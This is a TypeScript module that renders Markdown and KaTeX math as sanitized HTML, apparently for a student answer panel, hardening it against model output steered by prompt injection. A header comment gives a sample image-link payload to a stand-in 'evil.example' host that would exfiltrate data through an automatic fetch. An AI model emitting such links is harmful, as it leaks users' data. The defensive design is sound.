/**
 * Markdown → sanitized HTML with KaTeX (and mhchem) for $...$ / $$...$$.
 * Math is rendered before Markdown so underscores inside formulas survive,
 * then everything passes through DOMPurify.
 */
import DOMPurify from 'dompurify';
import katex from 'katex';
import 'katex/contrib/mhchem';
import { marked } from 'marked';

marked.setOptions({ gfm: true, breaks: false });

/**
 * Answers now come from a real model, and a page can try to steer a model
 * (prompt injection). Three consequences for what we render:
 * - Links open in the student's browser (platform/links.ts). Followed in
 *   place, a link would navigate the panel itself away from the app.
 * - Nothing is fetched. `![](https://evil.example/?q=…)`, a CSS
 *   `url(…)`, a `background` attribute or an SVG/MathML image would make the
 *   panel fetch a URL of the model's choosing with no click, carrying
 *   whatever it was talked into putting there. Answers are text and KaTeX;
 *   nothing needs a remote resource. (The pages' CSP refuses remote images
 *   too: src-tauri/tauri.conf.json.)
 * - An answer stays in its box: no fixed or absolute layers drawn over the
 *   rest of the panel, where a click would land on the model's link.
 */
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.namespaceURI !== HTML_NS) {
    // An SVG or MathML link is followed in place, past the link handler: none.
    node.removeAttribute('href');
    node.removeAttribute('xlink:href');
    // fill, filter, mask, clip-path… can name another document (`url(…)`,
    // escaped or not). KaTeX's own SVG and MathML never use ( or \.
    for (const { name, value } of [...node.attributes]) if (/[(\\]/.test(value)) node.removeAttribute(name);
  } else if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});
/** What KaTeX writes in a `style`: sizes, offsets, spacing, borders and colours. */
const KATEX_STYLE =
  /^(?:(?:min-|max-)?(?:width|height)|vertical-align|top|right|bottom|left|color|background-color|text-shadow|(?:margin|padding)(?:-(?:top|right|bottom|left))?|border(?:-(?:top|right|bottom|left))?-(?:width|style|color))$/;
/**
 * A `style` as the browser's own CSS parser reads it (escapes and comments
 * come out as the browser means them, which a pattern over the text never
 * matched), keeping only what KaTeX writes: nothing that fetches, and no
 * position but KaTeX's `relative`. The answer's box clips the rest
 * (panel.css .markdown).
 */
function katexStyle(value: string): string {
  const parsed = document.createElement('span').style;
  parsed.cssText = value;
  const kept: string[] = [];
  for (let i = 0; i < parsed.length; i++) {
    const name = parsed.item(i);
    const v = parsed.getPropertyValue(name);
    if ((KATEX_STYLE.test(name) || (name === 'position' && v === 'relative')) && !/url\s*\(|image/i.test(v)) kept.push(`${name}:${v}`);
  }
  return kept.join(';');
}
DOMPurify.addHook('uponSanitizeAttribute', (_node, data) => {
  if (data.attrName !== 'style') return;
  data.attrValue = katexStyle(data.attrValue);
  if (!data.attrValue) data.keepAttr = false;
});
const FORBID_TAGS = ['img', 'picture', 'source', 'video', 'audio', 'track', 'image', 'feimage', 'mglyph', 'link', 'style', 'form', 'input', 'button'];
/** Attributes that fetch (background, ping) on tags otherwise allowed. */
const FORBID_ATTR = ['background', 'ping', 'poster', 'srcset', 'action', 'formaction'];

const HTML_NS = 'http://www.w3.org/1999/xhtml';
const PLACEHOLDER = (i: number) => `\u0000MATH${i}\u0000`;

export function renderMath(tex: string, display: boolean): string {
  try {
    // maxSize: a formula can't stretch an answer (\\rule, \\kern) to any size.
    return katex.renderToString(tex, { displayMode: display, throwOnError: false, output: 'htmlAndMathml', strict: 'ignore', maxSize: 50 });
  } catch {
    return `<code>${escapeHtml(tex)}</code>`;
  }
}

/**
 * Markdown (math replaced by placeholders, rendered, then restored as KaTeX
 * HTML), sanitized, as DOM nodes ready to append: the panel never assigns
 * HTML to an element (innerHTML), it inserts what DOMPurify has already
 * parsed and cleaned.
 */
export function renderMarkdownFragment(src: string): DocumentFragment {
  return DOMPurify.sanitize(markdownHtml(src), { ...SANITIZE, RETURN_DOM_FRAGMENT: true });
}

const SANITIZE = { USE_PROFILES: { html: true, mathMl: true, svg: true }, FORBID_TAGS, FORBID_ATTR };

/**
 * Code as it is written: fenced blocks (to their closing fence, or the end
 * of an answer still arriving) and inline spans. Maths is read everywhere
 * else, never inside code, where `$` and `\(` are just characters (and a
 * drawn block's JSON: lib/blocks). As in CommonMark, a backtick fence's
 * first line has no other backtick (```x``` is a span); a span's backticks
 * are counted only so far, which keeps a long run of them quick.
 */
const CODE = /^ {0,3}(?:(`{3,})[^`\n]*|(~{3,})[^\n]*)(?:\n[\s\S]*?)?(?:\n {0,3}(?:\1|\2)[`~]*[ \t]*$|(?![\s\S]))|(`{1,16})[^`\n]+?\3(?!`)/gm;

function markdownHtml(src: string): string {
  const math: string[] = [];
  const code: string[] = [];
  let text = src.replace(CODE, (m: string) => {
    code.push(m);
    return `\u0000CODE${code.length - 1}\u0000`;
  });
  // Display math first: $$...$$ and \[...\]
  text = text.replace(/\$\$([\s\S]+?)\$\$|\\\[([\s\S]+?)\\\]/g, (_m, a: string | undefined, b: string | undefined) => {
    math.push(renderMath((a ?? b ?? '').trim(), true));
    return PLACEHOLDER(math.length - 1);
  });
  // Inline math: $...$ (not $$) and \(...\)
  text = text.replace(/(?<!\$)\$(?!\$)((?:\\\$|[^$\n])+?)\$(?!\$)|\\\(([\s\S]+?)\\\)/g, (_m, a: string | undefined, b: string | undefined) => {
    math.push(renderMath((a ?? b ?? '').trim(), false));
    return PLACEHOLDER(math.length - 1);
  });
  text = text.replace(/\u0000CODE(\d+)\u0000/g, (_m, i: string) => code[Number(i)] ?? '');
  let html = marked.parse(text, { async: false }) as string;
  return html.replace(/\u0000MATH(\d+)\u0000/g, (_m, i: string) => math[Number(i)] ?? '');
}

export function escapeHtml(s: string): string {
  return s.replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]!);
}
